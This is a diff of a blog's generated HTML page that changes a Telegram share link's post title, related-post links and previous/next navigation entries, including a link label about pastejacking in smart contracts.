-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data&amp;url=http://localhost:4000/blog/pastejacking-smart-contracts" title="Share via Telegram" target="_blank" rel="noopener" aria-label="">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Mycelial Lessons for Securing the Software Supply Chain&amp;url=http://localhost:4000/blog/mycelial-lessons-for-securing-the-software-supply-chain" title="Share via Telegram" target="_blank" rel="noopener" aria-label="">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.707 8.475C.275 8.64 0 9.508 0 9.508s.284.867.718 1.03l5.09 1.897 1.986 6.38a1.102 1.102 0 0 0 1.75.527l2.96-2.41a.405.405 0 0 1 .494-.013l5.34 3.87a1.1 1.1 0 0 0 1.046.135 1.1 1.1 0 0 0 .682-.803l3.91-18.795A1.102 1.102 0 0 0 22.5.075L.706 8.475z"/></svg>
     </div>
@@ -296,59 +270,59 @@ function(e) {
 
   
   
-
-  
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
     
+  
+  
+
+  
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+  
+
+  
+  
+
 
 
 
@@ -364,15 +338,6 @@ function(e) {
   
 
   
-    <div class="related-posts-post">
-  <a href="/blog/mycelial-lessons-for-securing-the-software-supply-chain">
-    Mycelial Lessons for Securing the Software Supply Chain
-  </a>
-</div>
-
-
-    
-  
 
   
     <div class="related-posts-post">
@@ -385,6 +350,15 @@ function(e) {
     
   
 
+  
+    <div class="related-posts-post">
+  <a href="/blog/crypto-executive-order-explained">
+    Crypto Executive Order Explained
+  </a>
+</div>
+
+
+    
   
 
   
@@ -408,11 +382,14 @@ function(e) {
     <div class="post-nav">
   <p>
     
+    <span class="post-nav-label">Previous</span><br>
+    <a href="/blog/disaster-recovery-drills-in-web-3">&#9194;&nbsp;Disaster Recovery Drills in Web 3.0</a>
+    
   </p>
   <p>
     
     <span class="post-nav-label">Next</span><br>
-    <a href="/blog/maximizing-the-benefit-and-utility-of-minting-nfts">Maximizing the Benefit and Utility of Minting NFTs&nbsp;&#9193;</a>
+    <a href="/blog/void-pool-dive-into-the-abyss-of-grimdark-finance">Void Pool: Dive into the Abyss of Grimdark Finance&nbsp;&#9193;</a>
     
   </p>
 </div>
